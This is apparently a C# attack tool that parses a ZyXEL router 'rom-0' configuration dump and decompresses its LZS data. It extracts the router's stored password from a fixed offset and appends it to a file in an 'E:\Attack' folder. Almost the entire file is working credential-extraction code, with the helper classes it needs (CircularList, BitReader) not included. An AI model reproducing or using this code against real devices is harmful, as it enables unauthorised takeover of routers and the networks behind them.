using System.Text;
using System;
using System.Collections.Generic;
using System.IO;

namespace ZyXEL_Firmware
{
    class Program
    {
        static void Main(string[] args)
        {
            string path = "E:\\Attack\\rom-0";
            string s;
            try
            {
                byte[] nuevo = Corta(path);
                //File.WriteAllBytes(openFileDialog1.FileName + ".decompressed", Decompress(openFileDialog1.FileName+".lzs"));
                s = ASCIIEncoding.ASCII.GetString(Decompress(nuevo));
                StringBuilder sb = new StringBuilder();

                int i = 20;

                while (s[i] >= 32 && s[i] <= 255)
                {
                    sb.Append(s[i]);
                    i++;
                }
                s = sb.ToString();
                string pass = "Password: " + s + "\n\n\n";
                File.AppendAllText("E:\\Attack\\password.txt", pass);
                //File.Delete(openFileDialog1.FileName + ".lzs");
                //File.WriteAllText("E:\\kq.txt", s);
            }
            catch (Exception l)
            {
            }                       
        }

        private static byte[] Corta(string path)
        {
            int index = 0;
            int q = 0;
            int inicio = 0;
            byte[] fileData = File.ReadAllBytes(path);

            for (int i = 0; i < fileData.Length; i++)
            {
                if ((fileData[i] == 0xCE) && (0x2160 < i && i < 0x2170)) 
                {
                    byte[] nuevo = new byte[fileData.Length - i];
                    for (int c = i; c < fileData.Length; c++)
                    {
                        nuevo[q] = fileData[c];
                        q++;
                    }
                    i = fileData.Length;
                    return nuevo;
                    //File.WriteAllBytes(path + ".lzs", nuevo);
                }
            }
            return null;
        }

        static byte[] Decompress(byte[] lzs)
        {
            int count = 0;
            var result = new List<byte>();
            byte[] fileData = lzs;
            int index = 0;
            int unknown = fileData[index++] << 24 | fileData[index++] << 16 | fileData[index++] << 8 | fileData[index++];
            int majorVersion = fileData[index++] << 8 | fileData[index++];
            int minorVersion = fileData[index++] << 8 | fileData[index++];
            int blockSize = fileData[index++] << 24 | fileData[index++] << 16 | fileData[index++] << 8 |
                            fileData[index++];
            while (count < 10)
            {
                int orgSize = fileData[index++] << 8 | fileData[index++];
                int rawSize = fileData[index++] << 8 | fileData[index++];
                var compressedData = new byte[rawSize];
                try
                {
                    Array.Copy(fileData, index, compressedData, 0, compressedData.Length);
                }
                catch
                {
                    Array.Copy(fileData, compressedData, fileData.Length);
                }
                byte[] decompressed = Decompress1(compressedData);
                result.AddRange(decompressed);
                index += rawSize;
                count++;
            }
            return result.ToArray();
        }

        private static byte[] Decompress1(byte[] bytes)
        {
            var result = new List<byte>();
            var window = new CircularList<byte>(2048);
            var reader = new BitReader(bytes);
            while (true)
            {
                bool bit = reader.ReadBit();
                if (!bit)
                {
                    byte character = reader.ReadByte();
                    result.Add(character);
                    window.Add(character);
                }
                else
                {
                    int offset;
                    bit = reader.ReadBit();
                    if (bit)
                    {
                        offset = reader.ReadBits(7);
                        if (offset == 0)
                        {
                            //end of file
                            break;
                        }
                    }
                    else
                    {
                        offset = reader.ReadBits(11);
                    }
                    int len;
                    int lenField = reader.ReadBits(2);
                    if (lenField < 3)
                    {
                        len = lenField + 2;
                    }
                    else
                    {
                        lenField <<= 2;
                        lenField += reader.ReadBits(2);
                        if (lenField < 15)
                        {
                            len = (lenField & 0x0f) + 5;
                        }
                        else
                        {
                            int lenCounter = 0;
                            lenField = reader.ReadBits(4);
                            while (lenField == 15)
                            {
                                lenField = reader.ReadBits(4);
                                lenCounter++;
                            }
                            len = 15 * lenCounter + 8 + lenField;
                        }
                    }
                    for (int i = 0; i < len; i++)
                    {
                        byte character = window.GetValue(-offset);
                        result.Add(character);
                        window.Add(character);
                    }
                }
            }
            return result.ToArray();
        }
    }
}
